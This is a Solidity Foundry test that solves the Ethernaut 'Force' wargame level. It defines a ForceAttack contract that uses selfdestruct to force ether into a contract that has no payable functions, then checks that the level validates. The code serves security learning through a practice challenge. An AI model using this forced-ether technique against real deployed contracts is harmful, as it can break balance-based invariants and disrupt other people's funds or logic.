pragma solidity ^0.8.0;

import "src/levels/07Force/Force.sol";
import "src/core/Ethernaut.sol";
import "src/levels/07Force/ForceFactory.sol";

import "forge-std/Test.sol";
import "forge-std/Vm.sol";

contract ForceAttack{
    address payable destination;
    constructor(Force forceInstance){
        destination = payable(address(forceInstance));
    }

    receive() external payable{
        selfdestruct(destination);
    }
}

contract TestForce is Test{
    Ethernaut ethernaut;
    address myEoaAddress = 0xB5Da00630Ca5fdE4d9cED2fcdA0C607cE198F159;
    function setUp() public{
        ethernaut = new Ethernaut();
        vm.deal(payable(myEoaAddress), 1 ether);
    }

    function testForce() public {
        ForceFactory forceFactory = new ForceFactory();
        ethernaut.registerLevel(forceFactory);
        vm.startPrank(myEoaAddress);
        address instanceAddress = ethernaut.createLevelInstance(forceFactory);
        Force forceInstance = Force(payable(instanceAddress));
        ForceAttack forceAttack = new ForceAttack(forceInstance);
        address(forceAttack).call{value: 1 ether}("");


        vm.stopPrank();
        bool result = forceFactory.validateInstance(payable(instanceAddress), myEoaAddress);
        assertTrue(result);

    }

}